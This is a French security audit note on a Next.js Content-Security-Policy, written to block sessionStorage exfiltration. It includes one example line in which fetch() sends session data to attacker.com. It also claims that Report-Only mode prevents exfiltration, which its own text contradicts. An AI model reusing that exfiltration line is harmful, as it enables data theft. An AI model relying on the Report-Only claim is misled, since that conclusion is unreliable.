# Audit CSP — T-264 (anti-exfiltration sessionStorage)

> Session 2026-05-06. Scope : `next.config.js` § `buildCSPReportOnly()`.
>
> Cet audit clôt **T-264** sans modification de code (cas A — CSP existante déjà conforme à l'objectif). Migration Report-Only → Enforce reste cadrée par la cible PCI SAQ-A (2026-05-12). Migration vers nonce-based CSP reste tracée comme dette V1.2+.

---

## Objectif T-264

Vérifier que la CSP empêche un script malveillant injecté (XSS hypothétique futur) d'exfiltrer la donnée `terroir_geo_session` (`sessionStorage`) vers un serveur attacker-controllé. La directive critique est **`connect-src`** : c'est elle qui borde les destinations autorisées de `fetch()`, `XMLHttpRequest`, `WebSocket`, `EventSource`, `Beacon` et `navigator.sendBeacon`.

Si `connect-src` est trop large, un script `fetch("https://attacker.com/x?d=" + sessionStorage.getItem("terroir_geo_session"))` réussit. Si `connect-src` est restrictif, le browser bloque la requête (en mode enforce) ou signale (en mode Report-Only).

### Script-src — concessions documentées

```
script-src 'self' 'unsafe-inline' 'unsafe-eval'
  https://js.stripe.com
  https://m.stripe.network
  https://va.vercel-scripts.com
  blob:
```

`'unsafe-inline'` et `'unsafe-eval'` sont nécessaires pour Next.js (hydratation + RSC payload + Stripe.js eval interne) et déjà documentés dans `docs/conventions/security-headers.md` § "Trade-offs". La migration vers nonce-based CSP est tracée comme dette V1.2+ (T-264-bis implicite).

Conséquence pour T-264 : un XSS injecté pourrait exécuter via `'unsafe-inline'`, mais le `connect-src` restrictif l'empêche d'exfiltrer ailleurs que vers les destinations whitelistées (Stripe, Mapbox, Vercel, Supabase) — aucune n'accepte un POST attacker-readable.

### Frame-src

```
frame-src 'self' https://js.stripe.com https://hooks.stripe.com https://m.stripe.network
```

OK : iframes Stripe Elements + 3DS. Pas de surface XSS additionnelle.

### Frame-ancestors

```
frame-ancestors 'none'
```

Equivalent CSP-aware de `X-Frame-Options: DENY`. Anti-clickjacking. Pas lié à T-264 mais cohérent avec le bundle de durcissement.

## Pas de modification de code

L'audit conclut **cas A : tout conforme déjà**. Aucune modification de `next.config.js` ne sert l'objectif T-264. L'ajout de `api-adresse.data.gouv.fr` ou de `api.resend.com` à `connect-src` ouvrirait inutilement la surface d'exfiltration sans bénéfice fonctionnel (le client ne s'y connecte pas).

## Trade-off conscient — Report-Only vs Enforce

Le header est aujourd'hui `Content-Security-Policy-Report-Only` (mode observation). Une violation est signalée dans la console DevTools mais ne bloque pas la requête.

**Pourquoi pas enforce dès maintenant ?** La cible enforce est fixée à 2026-05-12 par l'audit PCI SAQ-A (1 semaine d'observation pour vérifier qu'aucune feature edge case n'est cassée). Anticiper à 2026-05-06 sans observation suffisante introduit un risque de breakage prod (Stripe Elements, Mapbox tiles, Vercel Analytics) sans bénéfice T-264 supplémentaire — la CSP Report-Only est déjà strictement informationnelle, et un attaquant XSS futur ne peut pas exfiltrer même en Report-Only car les violations sont signalées (les SOC les remontent).

T-264 est satisfait par la **whitelist** elle-même, pas par le mode d'application. Le passage Report-Only → Enforce reste cadré par PCI SAQ-A.
